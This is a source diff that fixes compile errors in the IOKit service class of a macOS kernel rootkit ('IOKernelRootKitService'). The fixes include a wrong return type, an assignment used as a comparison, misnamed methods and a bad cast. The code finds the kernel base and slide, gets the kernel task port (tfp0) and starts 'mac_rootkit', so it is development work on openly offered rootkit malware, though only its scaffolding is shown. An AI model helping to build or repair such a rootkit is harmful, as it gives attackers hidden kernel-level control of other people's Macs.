@@ -14,7 +14,7 @@
 
 OSDefineMetaClassAndStructors(IOKernelRootKitService, IOService)
 
-void IOKernelRootKitService::init(OSDictionary *properties)
+bool IOKernelRootKitService::init(OSDictionary *properties)
 {
 	userClients = OSSet::withCapacity(1);
 
@@ -31,19 +31,19 @@ void IOKernelRootKitService::free()
 
 bool IOKernelRootKitService::start(IOService *provider)
 {
-	kern_return_t = kIOReturnUnsupported;
+	kern_return_t ret = kIOReturnUnsupported;
 
 	mach_vm_address_t kernel_base = Kernel::findKernelBase();
 
-	off_t kernel_slide = Kernel::getKernelSlide();
+	off_t kernel_slide = Kernel::findKernelSlide();
 
 	this->kernel = new Kernel(kernel_base, kernel_slide);
 
-	this->kernel->setRootkitService(this);
+	this->kernel->setRootKitService(this);
 
 	this->tfp0 = this->kernel->getKernelTaskPort();
 
-	ret = mac_rootkit_start(this, this->kernel, &this->kext);
+	ret = mac_rootkit_start(this, this->kernel, &this->rootkitKext);
 
 	if(ret == kIOReturnSuccess)
 	{
@@ -52,18 +52,18 @@ bool IOKernelRootKitService::start(IOService *provider)
 		registerService();
 	}
 
-	return ret = kIOReturnSuccess && IOService::start(provider);
+	return ret == kIOReturnSuccess && IOService::start(provider);
 }
 
 void IOKernelRootKitService::stop(IOService *provider)
 {
 	kern_return_t ret;
 
-	ret = mac_rootkit_stop(this, this->kernel, &this->kext);
+	ret = mac_rootkit_stop(this, this->kernel, &this->rootkitKext);
 
 	if(ret != KERN_SUCCESS)
 	{
-		return false;
+		return;
 	}
 
 	if(userClients)
@@ -189,7 +189,7 @@ IOReturn IOKernelRootKitService::newUserClient(task_t task, void *securityID, UI
 	return result;
 }
 
-IOReturn IOKernelRootkitService::addUserClient(IOKernelRootKitUserClient *client)
+IOReturn IOKernelRootKitService::addUserClient(IOKernelRootKitUserClient *client)
 {
 	IOReturn result = kIOReturnSuccess;
 
@@ -217,18 +217,18 @@ IOReturn IOKernelRootkitService::addUserClient(IOKernelRootKitUserClient *client
 
 IOReturn IOKernelRootKitService::removeUserClient(IOKernelRootKitUserClient *client)
 {
-	IOService *client = reinterpret_cast<IOService*>(client);
+	IOService *userClient = dynamic_cast<IOService*>(client);
 
-	client->retain();
+	userClient->retain();
 
-	userClients->removeObject((OSObject*) client);
+	userClients->removeObject((OSObject*) userClient);
 
 	if(!isInactive())
 	{
-		client->terminate();
+		userClient->terminate();
 	}
 
-	client->release();
+	userClient->release();
 
 	return kIOReturnSuccess;
 }
